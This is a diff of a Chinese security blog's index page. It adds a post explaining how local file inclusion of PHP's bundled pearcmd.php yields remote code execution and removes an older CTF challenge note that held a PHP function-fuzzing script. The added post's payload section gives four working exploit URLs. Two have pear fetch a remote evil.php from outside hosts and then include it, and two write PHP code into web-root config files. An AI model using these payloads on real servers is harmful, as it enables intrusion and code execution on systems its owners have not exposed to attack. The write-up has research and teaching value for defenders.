@@ -66,6 +66,117 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-LFI利用php自带的pearcmd.php直接RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" class="article-date">
+  <time class="dt-published" datetime="2020-10-20T07:48:24.276Z" itemprop="datePublished">2020-10-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="LFI利用php自带的pearcmd-php直接RCE"><a href="#LFI利用php自带的pearcmd-php直接RCE" class="headerlink" title="LFI利用php自带的pearcmd.php直接RCE"></a>LFI利用php自带的pearcmd.php直接RCE</h1><p>在做巅峰极客的一题时，用到了包含pearcmd.php从而RCE的点（perlcmd.php也是一样的），今天来研究一下这个点</p>
+<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>阅读pearcmd.php中关于参数产生的那部分代码发现：</p>
+<pre><code class="php">...
+if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;])) {
+    echo &#39;ERROR: either use the CLI php executable, &#39; .
+         &#39;or set register_argc_argv=On in php.ini&#39;;
+    exit(1);
+}
+
+$argv = Console_Getopt::readPHPArgv();
+...
+array_shift($argv);//这里删除了第一个argv，通常argv[0]是程序名
+...</code></pre>
+<p><code>Getopt.php:readPHPArgv</code></p>
+<pre><code class="php">
+    public static function readPHPArgv()
+    {
+        global $argv;
+        if (!is_array($argv)) {
+            if (!@is_array($_SERVER[&#39;argv&#39;])) {
+                if (!@is_array($GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;])) {
+                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;
+                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);
+                }
+                return $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;];
+            }
+            return $_SERVER[&#39;argv&#39;];
+        }
+        return $argv;
+    }</code></pre>
+<p>我们发现这里的参数是从<code>$_SERVER[&#39;argv&#39;]</code>（旧版本的就是：<code>$GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code>）中获取的</p>
+<p>我们来测试一下<code>$_SERVER[&#39;arvg&#39;]</code>,测试代码：<code>var_dump($_SERVER[&#39;argv&#39;]);</code></p>
+<p>访问<a href="http://127.0.0.1:60080/?1+2+3+4+%20+%dd" target="_blank" rel="noopener">http://127.0.0.1:60080/?1+2+3+4+%20+%dd</a></p>
+<pre><code>/var/www/html/index.php:4:
+array (size=6)
+  0 =&gt; string &#39;1&#39; (length=1)
+  1 =&gt; string &#39;2&#39; (length=1)
+  2 =&gt; string &#39;3&#39; (length=1)
+  3 =&gt; string &#39;4&#39; (length=1)
+  4 =&gt; string &#39;%20&#39; (length=3)
+  5 =&gt; string &#39;%dd&#39; (length=3)</code></pre><p>在$_SERVER[‘argv’]中的所有url编码都不会被解析，只是当成普通字符串，而+会被解析成参数的分隔符</p>
+<p>于是我们便可以像在命令行一样调用pearcmd.php了，接下来就变成了利用pearcmd这个命令getshell，直接命令行尝试（太懒了）</p>
+<p>查看pearcmd.php的帮助：<code>php pearcmd.php [options] command [command-options] &lt;parameters&gt;</code>，那么我们传参就得变成</p>
+<p><code>url/?+[options]+command+[command-options]+&lt;parameters&gt;</code>，?后面必须跟一个+号让其作为$argv[0],这里要注意+号的数量，因为这是拿来作为分隔符的如：<code>?++</code>就会被解析成<code>[&quot;&quot;,&quot;&quot;,&quot;&quot;]</code></p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020153757.png" alt="image1911"></p>
+<ol>
+<li>register_argc_argv=On（默认是开的）</li>
+<li>包含pearcmd.php或者peclcmd.php</li>
+</ol>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>这里直接给出payload，都是直接看帮助写出来的，没啥好说的。</p>
+<p>exp1:</p>
+<p>需要出网</p>
+<pre><code>http://192.168.43.230:60080/?+install+--installroot+/tmp/+http://ccreater.top:60006/evil.php++++++++++++++$&amp;f=pearcmd.php&amp;#把GET参数都塞到最后面
+http://192.168.43.230:60080/?f=/tmp/tmp/pear/download/install.php</code></pre><p>exp2:</p>
+<p>需要出网</p>
+<p>会下载到当前文件夹</p>
+<pre><code>http://192.168.43.230:60080/?+download+https://fuckyou.free.beeceptor.com/fuckyou.php+&amp;f=pearcmd.php#都塞到最后面
+http://192.168.43.230:60080/?f=fuckyou.php</code></pre><p>exp3:</p>
+<pre><code class="php">http://192.168.43.230:60080/?+config-create+/&lt;?=phpinfo();?&gt;/*+/var/www/html/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php#把GET参数都塞到路径中，这里可以用url编码来防止空格,/等对文件生成造成影响的字符
+http://192.168.43.230:60080/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php</code></pre>
+<p>exp4:</p>
+<p><strong>最好用</strong></p>
+<pre><code>http://192.168.43.230:60080/?+-c+/var/www/html/config2.php+-d+man_dir=&lt;?phpinfo();?&gt;/*+-s+list&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM#参数塞到最后面
+http://192.168.43.230:60080/config2.php</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/10/20/LFI利用php自带的pearcmd.php直接RCE/">http://blog.ccreater.top/2020/10/20/LFI利用php自带的pearcmd.php直接RCE/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" data-id="ckgho23b9000010vdhyht8rst" data-title="LFI利用php自带的pearcmd.php直接RCE" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-2020西湖论剑" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" class="article-date">
@@ -3023,123 +3134,6 @@ key=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：cc
 
 
   
-    <article id="post-ciscn2020easyphp出题笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-08-21T07:41:00.431Z" itemprop="datePublished">2020-08-21</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">ciscn2020easyphp出题笔记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="easyphp出题笔记"><a href="#easyphp出题笔记" class="headerlink" title="easyphp出题笔记"></a>easyphp出题笔记</h1><p>这题原意是想让大家写脚本来fuzz来发现CUFA/CUF中对引用处理不恰当而造成的崩溃，特意禁止了pcntl可是由于没有认真测试，忘记了还有CUF这个函数，结果有人直接绕过了。</p>
-<p>出题人想干的事情就是我们不让他干成就是对这种情况的最好解释。最后看到自己的题目被解成那样，我也是自闭了。</p>
-<p>继续正题吧。</p>
-<h2 id="来由"><a href="#来由" class="headerlink" title="来由"></a>来由</h2><p>之所以会出现这题是因为前段时间的wmctf的webweb反序列化出有这样一处的利用点，我为了找到合适的函数就采取fuzz，东西没发现倒是发现php崩溃了。</p>
-<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>直接去看<a href="https://bugs.php.net/bug.php?id=79979" target="_blank" rel="noopener">bugs.php</a> 上面的，会不会是因为交到bugs.php上的原因导致这么多人解了？</p>
-<h2 id="原解"><a href="#原解" class="headerlink" title="原解"></a>原解</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
-<p>fork子进程执行的代码是：</p>
-<pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){
-            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre>
-<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
-<pre><code class="php">&lt;?php
-
-    $payloads=[
-        &quot;ls&quot;,//shell命令执行测试
-        &quot;index.php&quot;,//读取文件测试
-        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试
-        &quot;echo 123;&quot;//php命令执行测试
-    ];
-    $str=file_get_contents(&quot;fatalerr.log&quot;);
-    if(!$str){
-        $str=&quot;[]&quot;;
-    }
-    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);
-    function show_result($func,$r,$v){
-        if($r==NULL){
-        }
-        try{
-            echo &quot;$func($v,false,true) return value:&quot;;
-            var_dump($r);
-            echo &quot;&lt;br /&gt;&quot;;
-        }catch(Exception $e){}
-    }
-
-    function brute_func($a){
-        global $payloads;
-        global $fatalerror;
-
-        foreach($a as $val){
-
-            if(is_array($val)){
-                brute_func($val);
-                continue;
-            }
-
-            if(in_array($val,$fatalerror)){
-                continue;
-            }
-            array_push($fatalerror,$val);
-            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));
-            foreach($payloads as $v){
-                $r=NULL;
-
-                $r=call_user_func_array($val,[$v,false,true]);
-                show_result($val,$r,$v);
-
-            }
-            array_pop($fatalerror);
-
-        }
-    };
-    $arr=get_defined_functions();
-    brute_func($arr);
-?&gt;</code></pre>
-<p>多次执行发现：</p>
-<pre><code class="php">stream_socket_server
-exec
-stream_socket_client</code></pre>
-<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码，但是这里我禁用了exec所以我们用另外两个函数引起segment fault查看phpinfo，在phpinfo中找到flag。</p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望有师傅有不同的解可以留个言啥的谢谢啦</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/08/21/ciscn2020easyphp出题笔记/">http://blog.ccreater.top/2020/08/21/ciscn2020easyphp出题笔记/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" data-id="cke3xdaeg0000csv0hewg35nk" data-title="ciscn2020easyphp出题笔记" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -3165,7 +3159,7 @@ stream_socket_client</code></pre>
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
     </div>
   </div>
 
@@ -3175,7 +3169,7 @@ stream_socket_client</code></pre>
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
     </div>
   </div>
 
@@ -3197,6 +3191,10 @@ stream_socket_client</code></pre>
       <ul>
         
           <li>
+            <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
+          </li>
+        
+          <li>
             <a href="/2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2020西湖论剑</a>
           </li>
         
@@ -3210,10 +3208,6 @@ stream_socket_client</code></pre>
         
           <li>
             <a href="/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">jdk7u21反序列化复现</a>
           </li>
         
       </ul>
